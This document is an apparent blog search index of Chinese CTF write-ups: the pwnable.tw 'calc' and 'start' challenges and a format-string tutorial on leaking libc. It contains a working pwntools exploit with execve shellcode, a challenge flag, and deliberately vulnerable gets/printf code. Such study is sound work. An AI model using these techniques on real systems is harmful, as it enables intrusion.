<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pwnable.tw/[pwnable.tw] calc — 150pt</title>
    <url>/2019/12/17/Pwnable.tw/%5Bpwnable.tw%5D%20calc%20%E2%80%94%20150pt/</url>
    <content><![CDATA[<p>处理+100情况时:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">number_pool中 number_pool[<span class="number">0</span>]为pool中的数字个数,Eval()中处理“+”时:</span><br><span class="line"></span><br><span class="line">number_pool[\*number_pool - <span class="number">1</span>] += number_pool[*number_pool];</span><br><span class="line"></span><br><span class="line">处理+<span class="number">100</span>时 number_pool[<span class="number">0</span>]为<span class="number">1</span></span><br><span class="line"></span><br><span class="line"> number_pool[<span class="number">0</span>] = number_pool[<span class="number">0</span>] + number_pool[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">==》number_pool[<span class="number">0</span>] =  <span class="number">1</span> + <span class="number">100</span> = <span class="number">101</span></span><br><span class="line"></span><br><span class="line">然后--*number_pool;使得number_pool[<span class="number">0</span>]=<span class="number">100</span></span><br></pre></td></tr></table></figure>



<p>如果一开始输入的为 +100+2</p>
<p>在处理+2时,一开始的+100已经使得number_pool[0] =   100,此时</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">处理+<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> ( value1 &gt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   v4 = (*number_pool)++;                  <span class="comment">// v4为result_pool[0],存放的是pool中有多少个数字,这里v4=number的值没有加一</span></span><br><span class="line">   number_pool[v4 + <span class="number">1</span>] = value1;           <span class="comment">// 将值依次序放入</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> v4 = <span class="number">100</span></span><br><span class="line"> number_pool[<span class="number">100</span> + <span class="number">1</span>] = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">number_pool[<span class="number">101</span><span class="number">-1</span>] = number_pool[<span class="number">100</span>]  =  number_pool[<span class="number">100</span>] +number_pool[<span class="number">101</span>] ;</span><br><span class="line"></span><br><span class="line">此时number_pool[<span class="number">101</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">number_pool[<span class="number">100</span>]  += <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>在这里可以实现任意地址的读写</p>
<p>第一次扫描到“+”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    符号表中没有符号,执行symbols[count] = expr_str[i];</span><br><span class="line">    ↓</span><br><span class="line"> ► 0x80491e3 &lt;parse_expr+441&gt;    mov    edx, dword ptr [ebp - 0x84]</span><br><span class="line">   0x80491e9 &lt;parse_expr+447&gt;    mov    eax, dword ptr [ebp - 0x8c]</span><br><span class="line">   0x80491ef &lt;parse_expr+453&gt;    add    eax, edx</span><br><span class="line">   0x80491f1 &lt;parse_expr+455&gt;    movzx  eax, byte ptr [eax]</span><br><span class="line">   0x80491f4 &lt;parse_expr+458&gt;    lea    ecx, dword ptr [ebp - 0x70]</span><br><span class="line">   0x80491f7 &lt;parse_expr+461&gt;    mov    edx, dword ptr [ebp - 0x80]</span><br><span class="line">─────────────────────────────────[ STACK ]─────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcf40 —▸ 0x80f05d8 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf44 —▸ 0x80bf7a8 ◂— xor    byte ptr [eax], al /* &apos;0&apos; */</span><br><span class="line">02:0008│      0xffffcf48 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffcf58 —▸ 0xffffd008 ◂— 0x0</span><br><span class="line">07:001c│      0xffffcf5c —▸ 0xffffd19c ◂— &apos;+100+2&apos;</span><br><span class="line">───────────────────────────────[ BACKTRACE ]───────────────────────────────</span><br><span class="line"> ► f 0  80491e3 parse_expr+441</span><br><span class="line">   f 1  80493f2 calc+121</span><br><span class="line">   f 2  8049499 main+71</span><br><span class="line">   f 3  804967a __libc_start_main+458</span><br><span class="line">───────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x /wx $ebp - 0x84</span><br><span class="line">0xffffcf64:     0x00000000</span><br><span class="line">pwndbg&gt; x /wx $ebp - 0x8c</span><br><span class="line">0xffffcf5c:     0xffffd19c</span><br><span class="line">pwndbg&gt; x /s 0xffffd19c</span><br><span class="line">0xffffd19c:     &quot;+100+2&quot;</span><br><span class="line">此处执行后,symbols[0] = “+”</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> EAX  0x2b</span><br><span class="line"> EBX  0x80481b0 (_init) ◂— push   ebx</span><br><span class="line"> ECX  0x2</span><br><span class="line"> EDX  0xffffcf78 ◂— 0x2b /* &apos;+&apos; */</span><br><span class="line"> EDI  0x80ec00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069120 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffcf38 —▸ 0xffffcfe8 —▸ 0xffffd5a8 —▸ 0xffffd5c8 —▸ 0x8049c30 (__libc_csu_fini) ◂— ...</span><br><span class="line"> ESP  0xffffcf2c ◂— 0x2b /* &apos;+&apos; */</span><br><span class="line"> EIP  0x8048f1a (eval+57) ◂— mov    eax, dword ptr [ebp + 8]</span><br><span class="line">────────────────────────────────────[ DISASM ]─────────────────────────────────────</span><br><span class="line">   0x8048ee9 &lt;eval+8&gt;     mov    eax, dword ptr [ebp + 0xc]</span><br><span class="line">   0x8048eec &lt;eval+11&gt;    mov    byte ptr [ebp - 0xc], al</span><br><span class="line">   0x8048eef &lt;eval+14&gt;    movsx  eax, byte ptr [ebp - 0xc]</span><br><span class="line">   0x8048ef3 &lt;eval+18&gt;    cmp    eax, 0x2b</span><br><span class="line">   0x8048ef6 &lt;eval+21&gt;    je     eval+57 &lt;0x8048f1a&gt;</span><br><span class="line">    ↓</span><br><span class="line"> ► 0x8048f1a &lt;eval+57&gt;    mov    eax, dword ptr [ebp + 8]</span><br><span class="line">   0x8048f1d &lt;eval+60&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x8048f1f &lt;eval+62&gt;    lea    edx, dword ptr [eax - 2]</span><br><span class="line">   0x8048f22 &lt;eval+65&gt;    mov    eax, dword ptr [ebp + 8]</span><br><span class="line">   0x8048f25 &lt;eval+68&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x8048f27 &lt;eval+70&gt;    lea    ecx, dword ptr [eax - 2]</span><br><span class="line">─────────────────────────────────────[ STACK ]─────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcf2c ◂— 0x2b /* &apos;+&apos; */</span><br><span class="line">01:0004│      0xffffcf30 —▸ 0x80481b0 (_init) ◂— push   ebx</span><br><span class="line">02:0008│      0xffffcf34 ◂— 0x0</span><br><span class="line">03:000c│ ebp  0xffffcf38 —▸ 0xffffcfe8 —▸ 0xffffd5a8 —▸ 0xffffd5c8 —▸ 0x8049c30 (__libc_csu_fini) ◂— ...</span><br><span class="line">04:0010│      0xffffcf3c —▸ 0x8049308 (parse_expr+734) ◂— sub    dword ptr [ebp - 0x80], 1</span><br><span class="line">05:0014│      0xffffcf40 —▸ 0xffffd008 ◂— 0x65 /* &apos;e&apos; */</span><br><span class="line">06:0018│      0xffffcf44 ◂— 0x2b /* &apos;+&apos; */</span><br><span class="line">07:001c│      0xffffcf48 ◂— 0x1</span><br><span class="line">───────────────────────────────────[ BACKTRACE ]───────────────────────────────────</span><br><span class="line"> ► f 0  8048f1a eval+57</span><br><span class="line">   f 1  8049308 parse_expr+734</span><br><span class="line">   f 2  80493f2 calc+121</span><br><span class="line">   f 3  8049499 main+71</span><br><span class="line">   f 4  804967a __libc_start_main+458</span><br><span class="line">此处观测 +2,可以看到[ebp + 8] 值为0x65 (101)</span><br></pre></td></tr></table></figure>



<p>一个函数使用的所有栈空间必须是16字节的整数倍”应该是指栈的起始地址是16的整数倍，代码“and  $0xfffffff0,%esp”应该就是保证栈指针esp是16的整数倍的</p>
<figure class="highlight plain"><figcaption><span>push    ebp</span></figcaption><table><tr><td class="code"><pre><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08049458                 sub     esp, 16</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Pwnable.tw/[pwnable.tw] start — 100pt</title>
    <url>/2019/11/26/Pwnable.tw/%5Bpwnable.tw%5D%20start%20%E2%80%94%20100pt/</url>
    <content><![CDATA[<p>刚拿到题有点懵,纯汇编代码,两个操作,一个是调用<code>write()</code>输出一段字符串,第二个是调用<code>read()</code>读取0x3c个字符,查看保护,发现是32位程序,保护全关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>对于堆栈的操作一开始有push 20字节进栈里,后面从stdin读取60个字节,存在栈溢出可以控制程序流程,考虑构造ROP,但是并没有发现”pop|ret”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  pwnable.tw ROPgadget --binary start</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048099 : add esp, 0x14 ; ret</span><br><span class="line">0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x080480a0 : inc eax ; int 0x80</span><br><span class="line">0x0804808f : int 0x80</span><br><span class="line">0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048095 : mov al, 3 ; int 0x80</span><br><span class="line">0x0804808d : mov al, 4 ; int 0x80</span><br><span class="line">0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804809c : ret</span><br><span class="line">0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x0804809e : xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 18</span><br></pre></td></tr></table></figure>

<p>考虑使用int80中断执行execve(“/bin/sh”),但是不存在可以操作的寄存器的rop</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Name</th>
<th>Registers</th>
<th>Definition</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>eax</td>
<td>ebx</td>
<td>ecx</td>
<td>edx</td>
<td>esi</td>
<td>edi</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>11</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td>
<td>0x0b</td>
<td>char __user *</td>
<td>char <strong>user *</strong>user *</td>
<td>char <strong>user *</strong>user *</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:925</a></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>

<p>再次查看汇编代码,发现<code>.text:08048087                 mov     ecx, esp        ; addr</code>这里将esp的值写入ec x,这条汇编代码出现的很突兀,ecx是write指向输出的地址,这里利用栈溢出可以再将程序流程回到0x8048087输出栈地址,然后将执行execve(“/bin/sh”)的指令写入栈中ret时执行.</p>
<p>第二次回到<code>0x8048087</code>执行完<code>mov     ecx, esp</code>时,栈内布局如下,可以读取到<code>$esp(0xfffec6ec)</code>的值<code>(0xfffec6f0)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec6f0 ◂— 0x1</span><br><span class="line">01:0004│          0xfffec6f0 ◂— 0x1</span><br><span class="line">02:0008│          0xfffec6f4 —▸ 0xfffee7ac ◂— &apos;./start&apos;</span><br><span class="line">03:000c│          0xfffec6f8 ◂— 0x0</span><br></pre></td></tr></table></figure>



<p>返回地址为<code>0xfffec6ec+0x14 = 0x0xfffec700</code>,这里就可以计算返回地址和写入shellcode的位置,需要注意的是这里读入的60bytes,我在这里写入的返回地址为<code>0xfffec70c</code>,需要覆盖掉前面的长度为<code>0xfffec70c -0xfffec6ec = 0x20</code>,需要填充8个<code>p32(esp)</code>,将shellcode从<code>0xfffec70c</code>开始布局<code>(这里可以自己试下其他的写入位置和偏移)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0x804808f  &lt;_start+47&gt;    int    0x80</span><br><span class="line">   0x8048091  &lt;_start+49&gt;    xor    ebx, ebx</span><br><span class="line">   0x8048093  &lt;_start+51&gt;    mov    dl, 0x3c</span><br><span class="line">   0x8048095  &lt;_start+53&gt;    mov    al, 3</span><br><span class="line">   0x8048097  &lt;_start+55&gt;    int    0x80</span><br><span class="line"> ► 0x8048099  &lt;_start+57&gt;    add    esp, 0x14</span><br><span class="line">   0x804809c  &lt;_start+60&gt;    ret</span><br><span class="line">    ↓</span><br><span class="line">   0xfffec70c                xor    eax, eax</span><br><span class="line">   0xfffec70e                push   eax</span><br><span class="line">   0xfffec70f                push   0x68732f2f</span><br><span class="line">   0xfffec714                push   0x6e69622f</span><br><span class="line">──────[ STACK ]──────</span><br><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec70c ◂— 0x6850c031</span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>





<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding='utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">20</span></span><br><span class="line">payload += p32(<span class="number">0x08048087</span>)</span><br><span class="line">shellcode = unhex(<span class="string">'31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80'</span>)</span><br><span class="line">sh = process(<span class="string">"./start"</span>)</span><br><span class="line">sh = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line"><span class="comment">#raw_input("1:")</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv()[:<span class="number">4</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">esp = esp  + <span class="number">0x1c</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line">payload = p32(esp)*<span class="number">8</span> +  shellcode</span><br><span class="line"><span class="keyword">assert</span> len(payload) &lt;= <span class="number">60</span>,<span class="string">"more than 60 bytes,error"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<p>参考链接</p>
<p><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a></p>
<p><a href="https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6" target="_blank" rel="noopener">https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6</a></p>
]]></content>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/2019/11/20/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>#格式化字符串小结</p>
<p>##预备知识</p>
<p>​        格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p>
<p>首先我们从原理出发,参考[wiki][<a href="https://wiki.x10sec.org/pwn/fmtstr/fmtstr_intro/#_4].这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。**那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制**。比如说&#39;%s&#39;表明我们会输出一个字符串参数" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/fmtstr/fmtstr_intro/#_4].这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。**那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制**。比如说&#39;%s&#39;表明我们会输出一个字符串参数</a></p>
<p>以下面的例子进行介绍</p>
<p><img src="/Users/sl/Desktop/fmtpic/printf.png" alt="printf"></p>
<p>假设进入<code>printf</code>函数前栈中的布局如下所示(栈分布由 高地址 -&gt;低地址)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">some value                         高地址</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="number">123456</span></span><br><span class="line">addr of <span class="string">"red"</span></span><br><span class="line">addr of format <span class="built_in">string</span>: Color %s... 低地址  这里是指向格式化字符串的地址,可能这个字串在更高的地址</span><br></pre></td></tr></table></figure>

<p>在进入<code>printf</code>之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
<ul>
<li>当前字符不是%，直接输出到相应标准输出</li>
<li>当前字符是%， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是%,输出%</li>
<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
</ul>
</li>
</ul>
<p>如果在编程中将程序写成了下面的样子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Color %s, Number %d, Float %4.2f"</span>);</span><br></pre></td></tr></table></figure>

<p>此时也是按照上面的解析方法,此时栈上的分布如下,对于储存格式化字符串的地址上面的<code>some value</code>会被解析成不同的类型,对于2，3来说倒还无妨，但是对于对于1来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。</p>
<ol>
<li>解析其地址对应的字符串</li>
<li>解析其内容对应的整形值</li>
<li>解析其内容对应的浮点值</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">some value                         高地址</span><br><span class="line">some value		解析其内容对应的浮点值</span><br><span class="line">some value		解析其内容对应的整形值</span><br><span class="line">some value		解析其地址对应的字符串</span><br><span class="line">addr of format <span class="built_in">string</span>: Color %s... 低地址  这里是指向格式化字符串的地址,可能这个字串在更高的地址</span><br></pre></td></tr></table></figure>



<p>格式化占位符（format placeholder），语法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br><span class="line"></span><br><span class="line">Parameter field  n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出</span><br><span class="line"></span><br><span class="line">//这里%1 %2分别代表了第一个和第二个参数(从左至右)</span><br><span class="line">For example, printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) produces 17 0x11; 16 0x10.</span><br><span class="line"></span><br><span class="line">Field Width给出显示数值的最小宽度,如果域宽值为*，则由对应的函数参数的值为当前域宽</span><br></pre></td></tr></table></figure>

<p>##泄漏libc基址</p>
<p>​        首先先简单的分析下一个程序跑起来会发生哪些事情.程序执行的起点是<code>_start</code>,一般大家都知道程序在执行的时候会将main作为参数传入<code>__libc_start_main</code>中,执行一些操作之后再调用<code>main</code>,也就是说<code>main</code>的<code>return address</code>会指向libc内部且存放在stack上可以泄露出来    (在<code>libc-2.23.so</code>上<code>return address</code>就是我们熟悉的 <code>__libc_start_main+240</code>)  </p>
<p>在IDA里查看<code>_start</code>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400630                 public _start</span><br><span class="line">.text:0000000000400630 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400630 ; __unwind &#123;</span><br><span class="line">.text:0000000000400630                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400632                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400635                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400636                 mov     rdx, rsp        ; ubp_av</span><br><span class="line"></span><br><span class="line"> 这里and 0FFFFFFFFFFFFFFF0h 是为了16字节对齐</span><br><span class="line">.text:0000000000400639                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040063D                 push    rax</span><br><span class="line">.text:000000000040063E                 push    rsp             ; stack_end]</span><br><span class="line"></span><br><span class="line"> 这里把__libc_csu_fini __libc_csu_fini main当作参数传递给___libc_start_main</span><br><span class="line">.text:000000000040063F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000400646                 mov     rcx, offset __libc_csu_fini ; init</span><br><span class="line">.text:000000000040064D                 mov     rdi, offset main ; main</span><br><span class="line"></span><br><span class="line">               !!!这里调用___libc_start_main!!!</span><br><span class="line">.text:0000000000400654                 call    ___libc_start_main  </span><br><span class="line">.text:0000000000400659                 hlt</span><br><span class="line">.text:0000000000400659 ; &#125; // starts at 400630</span><br><span class="line">.text:0000000000400659 _start          endp</span><br></pre></td></tr></table></figure>



<p><code>objdump -d  /lib/x86_64-linux-gnu/libc-2.23.so | less</code> 查看libc,搜索<code>__libc_start_main</code>,会得到如下的结果,其中<code>call exit</code> 前面的<code>call</code>就是<code>call main</code> ,然后<code>mov    %eax,%edi</code> 是<code>main</code>将返回的地方,exit执行后续的一些操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20816:       48 8b 05 9b 36 3a 00    mov    0x3a369b(%rip),%rax        # 3c3eb8 &lt;_IO_file_jumps@@GLIBC_2.2.5+0x7d8&gt;</span><br><span class="line">2081d:       48 8b 74 24 08          mov    0x8(%rsp),%rsi</span><br><span class="line">20822:       8b 7c 24 14             mov    0x14(%rsp),%edi</span><br><span class="line">20826:       48 8b 10                mov    (%rax),%rdx</span><br><span class="line">20829:       48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">2082e:       ff d0                   callq  *%rax</span><br><span class="line"></span><br><span class="line">这里的20830就是我们熟悉的__libc_start_main+240在libc中的偏移</span><br><span class="line">20830:       89 c7                   mov    %eax,%edi</span><br><span class="line">20832:       e8 f9 97 01 00          callq  3a030 &lt;exit@@GLIBC_2.2.5&gt;</span><br><span class="line">20837:       31 d2                   xor    %edx,%edx</span><br><span class="line">20839:       e9 3b ff ff ff          jmpq   20779 &lt;__libc_start_main@@GLIBC_2.2.5+0x39&gt;</span><br></pre></td></tr></table></figure>

<p>用gdb打开 ,lay asm 查看汇编代码,<code>x4006f8 &lt;main+82&gt;              callq  0x400550 &lt;printf@plt&gt;</code>,在<code>printf</code>处下断点,执行输入<code>aaaa</code>,然后查看stack上的内容,在elf64中函数传参用前六个参数用传参<code>rdi</code>，<code>rsi</code>，<code>rax</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>，如果多余的就用在<code>call printf</code>之前<code>push</code>到栈里，这里也可以看到，参数栈也不是连续的(因为前面几个参数在寄存器里)。多于6个的参数，从右往左依次入栈,所以在计算参数偏移的时候，偏移量应该是<code>5 + （目的地址 - ret)/8</code>(即栈上的第一个值是第六个参数)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;%s&quot;, 6 , 5 , 4 , 3 , 2 , 1)</span><br><span class="line">				rdi rsi rdx rcx r8  r9  栈中</span><br></pre></td></tr></table></figure>

<p><code>RSP</code>寄存器指向存在栈中的参数,根据控制符可以读取相应规格的内存数据,这里用<code>%21$lx</code>就可以泄露出libc上的地址了(<code>libc_start_main+240</code>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//practice1.c 源码</span><br><span class="line">//gcc practice1.c -o practice1</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    alarm(180);</span><br><span class="line">    char str[100];</span><br><span class="line">    while(gets(str))&#123;</span><br><span class="line">        printf(str);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./practice1</span><br><span class="line">aaaa %21$lx</span><br><span class="line">aaaa 7fc482204830</span><br><span class="line">在gdb中可以看到一开始输入的aaaa在栈上的地址为0x7fffffffe3f0,这个地方是%6$lx,继续往下数发现0x7fffffffe468是我们需要的___libc_start_main+240地址,数过来标号是%21$lx</span><br><span class="line">(gdb) x /100gx $rsp</span><br><span class="line">0x7fffffffe3f0:	0x0000000061616161	0x00007fffffffe558</span><br><span class="line">0x7fffffffe400:	0x0000000000000001	0x00007fffffffe480</span><br><span class="line">0x7fffffffe410:	0x00007ffff7ffe168	0x0000000000f0b5ff</span><br><span class="line">0x7fffffffe420:	0x0000000000000001	0x000000000040077d</span><br><span class="line">0x7fffffffe430:	0x00007fffffffe45e	0x0000000000000000</span><br><span class="line">0x7fffffffe440:	0x0000000000400730	0x00000000004005b0</span><br><span class="line">0x7fffffffe450:	0x00007fffffffe540	0x06219b1906cba600</span><br><span class="line">0x7fffffffe460:	0x0000000000400730	0x00007ffff7a2d830 (数到为第21个参数,这里可以看出最后三位830和一开始直接查看libc上是一样的)</span><br><span class="line">0x7fffffffe470:	0x0000000000000001	0x00007fffffffe548</span><br><span class="line"></span><br><span class="line">(gdb) x /i 0x00007ffff7a2d830</span><br><span class="line">   0x7ffff7a2d830 &lt;__libc_start_main+240&gt;:	mov    %eax,%edi</span><br></pre></td></tr></table></figure>



<p>是不是不太相信,没关系自己调一遍就好了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test</span></span><br><span class="line"><span class="comment">//test.c 源码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%x"</span>,&amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译好后配合IDA和gdb调试,在<code>_start</code>位置下断点,发现和开始分析的一样,<code>main</code>被当成参数传递给了<code>__libc_start_main</code></p>
<p><img src="/Users/sl/Desktop/fmtpic/STACK1.png" alt="STACK1"></p>
